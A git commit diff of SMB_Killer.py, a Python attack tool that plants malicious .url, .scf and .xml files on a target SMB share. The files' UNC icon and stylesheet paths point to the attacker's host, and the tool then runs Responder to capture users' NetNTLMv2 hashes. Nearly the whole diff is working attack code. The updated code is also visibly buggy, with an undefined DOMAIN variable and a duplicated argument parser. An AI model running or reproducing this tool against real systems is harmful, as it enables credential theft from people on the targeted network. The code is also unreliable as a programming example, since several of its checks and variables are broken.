8afe7f7d68f7dab586151d2434fe0401a7615c32
overgrowncarrot1 <78485709+overgrowncarrot1@users.noreply.github.com>
2023-05-06 09:33:47 -0400

    Update SMB_Killer.py

--- SMB_Killer.py
+++ SMB_Killer.py
@@ -3,84 +3,147 @@
 import os
 import argparse
 import sys
+import time
+try:
+    from colorama import Fore
+except ImportError:
+    os.system("pip3 install colorama")
+    os.system("pip install colorama")
 
-ip = "10.10.0.16" #change this
-interface = "tun0" #change this
-rhost = "172.31.1.4" #change this
-share = "Office_Share" #change this to rhost share
-domain = "secret" #change this to domain name
-username = "" #leave blank for anonymous access
-password = "" #leave blank for anonymous access
+RED = Fore.RED
+YELLOW = Fore.YELLOW
+GREEN = Fore.GREEN
+MAGENTA = Fore.MAGENTA
+BLUE = Fore.BLUE
+RESET = Fore.RESET
 
-print("\033[1;31m Script used for SMB when uploading file to get NetNTLMv2 hash") #red text
-print("")
-print("\033[1;32m Make sure to change IP, interface, rhost, share and domain. If no username or password is needed then leave blank")
-print("\033[1;39m ")
+
+
+print(RED+    " _____ _____  _____     ________  _________     _   _______ _      _      ___________ ")
+print(YELLOW+ "|  _  |  __ \/  __ \   /  ___|  \/  || ___ \   | | / /_   _| |    | |    |  ___| ___ \\")
+print(GREEN+  "| | | | |  \/| /  \/   \ `--.| .  . || |_/ /   | |/ /  | | | |    | |    | |__ | |_/ /")
+print(MAGENTA+"| | | | | __ | |        `--. \ |\/| || ___ \   |    \  | | | |    | |    |  __||    / ")
+print(BLUE+   "\ \_/ / |_\ \| \__/\   /\__/ / |  | || |_/ /   | |\  \_| |_| |____| |____| |___| |\ \ ")
+print(RED+    " \___/ \____/ \____/   \____/\_|  |_/\____/    \_| \_/\___/\_____/\_____/\____/\_| \_|")
+print(YELLOW+ "                                                                                      "+RESET)
+                                                                                      
+
+
 
 parser = argparse.ArgumentParser(description="SMB Killer",
 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+
+parser = argparse.ArgumentParser(description="SMB Killer", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
+parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
+parser.add_argument("-i", "--Interface", action="store", help="LPORT")
+parser.add_argument("-a", "--Share", action="store", help="Share Name")
+parser.add_argument("-U", "--Username", action="store", help="Username")
+parser.add_argument("-P", "--Password", action="store", help="Password")
 parser.add_argument("-u", "--url", action="store_true", help="URL File")
 parser.add_argument("-s", "--scf", action="store_true", help="SCF File")
 parser.add_argument("-x", "--xml", action="store_true", help="XML File")
+parser.add_argument("-A", "--All", action="store_true", help="Send up all files (URL, SCF and XML)")
 args = parser.parse_args()
 
-def url(ip):
-	print("")
-	print("\033[1;31m Making @evil.url")
-	print("\033[1;39m ") #returns to white text
+RHOST = args.RHOST
+LHOST = args.LHOST
+INTERFACE = args.Interface
+SHARE = args.Share
+USERNAME = args.Username
+PASSWORD = args.Password
+URL = args.url
+SCF = args.scf
+XML = args.xml
+ALL = args.All
+
+parser.parse_args(args=None if sys.argv[1:] else ['--help'])
+
+if (SCF == None and URL == None and XML == None and ALL == None):
+    print(YELLOW+"What do you want from me!!!"+RESET)
+    parser.print_help()
+    sys.exit()
+
+if (USERNAME != None and PASSWORD == None):
+	print(RED+"Need password if utilizing a username"+RESET)
+
+def url():
+	print(YELLOW+"Making @evil.url \n"+RESET)
 	f = open("@evil.url", "w")
 	template = f"""[InternetShortcut]\n
 URL=whatever\n
 WorkingDirectory=whatever\n
-IconFile=\\\\"""+ip+"""\\%USERNAME%.icon\n
+IconFile=\\\\"""+LHOST+"""\\%USERNAME%.icon\n
 IconIndex=1"""
 	f.write(template)
-	print("\033[1;31m Putting file into smb server, once done exit out of SMB Server and responder will automatically start")
-	print("")
-	input("\033[1;32m Press enter to continue")
-	print("\033[1;39m ") #returns to white text
-	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""")
-	os.system("""sudo responder -I """+interface+""" -wv""") 
+	time.sleep(1)
+	print(GREEN+"Putting file into smb server, responder will automatically start \n"+RESET)
 
-def scf(ip):
-	print("")
-	print("\033[1;31m Making @evil.scf")
-	print("\033[1;39m ") #returns to white text
+def scf():
+	print(YELLOW+"Making @evil.scf \n"+RESET)
 	f = open("@evil.scf", "w")
 	template= f"""[Shell]\n
 Command=2\n
-IconFile=\\\\"""+ip+"""\\tools\\nc.ico\n
+IconFile=\\\\"""+LHOST+"""\\tools\\nc.ico\n
 [Taskbar]\n
 Command=ToggleDesktop"""
 	f.write(template)
-	print("\033[1;31m Putting file into smb server")
-	print("")
-	input("\033[1;32m Press enter to continue")
-	print("\033[1;39m ") #returns to white text
-	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""") 
-	os.system("""sudo responder -I """+interface+""" -wv""") 
-
-def xml(ip):
-	print("")
-	print("\033[1;31m Making @evil.xml")
-	print("\033[1;39m ") #returns to white text
+	print(GREEN+"Putting file into smb server and starting Responder \n "+RESET)
+	
+def xml():
+	print(YELLOW+"Making @evil.xml \n"+RESET)
 	f = open("@evil.xml", "w")
 	template= f"""("<?xml version='1.0' encoding='UTF-8' standalone='yes'?>\n"
 	"<?mso-application progid='Word.Document'?>\n"
-	"<?xml-stylesheet type='text/xsl' href='\\\\"""+ip+"""\\evil.xsl' ?>")"""
+	"<?xml-stylesheet type='text/xsl' href='\\\\"""+LHOST+"""\\evil.xsl' ?>")"""
 	f.write(template)
-	print("\033[1;31m Putting file into smb server, once done exit out of SMB Server and responder will automatically start")
-	print("")
-	input("\033[1;32m Press enter to continue")
-	print("\033[1;39m ") #returns to white text
-	os.system("""smbclient \\\\\\\\"""+rhost+"""\\\\"""+share+""" -U """+domain+"""/"""+username+"""%"""+password+"""""")
-	os.system("""sudo responder -I """+interface+""" -wv""")  
+	print(GREEN+"Putting file into smb server, once done exit out of SMB Server and responder will automatically start \n"+RESET)
+	
+def URL_File():
+	if (USERNAME != None and PASSWORD != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.url'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+	else:
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.url'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+
+def SCF_File():
+	if (USERNAME != None and PASSWORD != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.scf'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+	else:
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.scf'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+
+def XML_File():
+	if (USERNAME != None and PASSWORD != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+	else:
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+
+def ALL():
+	if (USERNAME != None and PASSWORD != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml; put @evil.scf; put @evil.url'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+	else:
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml; put @evil.url; put @evil.scf'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
 
 if args.url == True:
-	url(ip)
+	url()
+	URL_File()
 if args.scf == True:
-	scf(ip)
+	scf()
+	SCF_File()
 if args.xml == True:
-	xml(ip)
+	xml()
+	XML_File()
+if args.All == True:
+	xml()
+	url()
+	scf()
+	ALL()
 
 #Thank you dze64 for all the help while making this, he made it much better but I wanted / needed to learn some python, had a lot of fun making this and learning
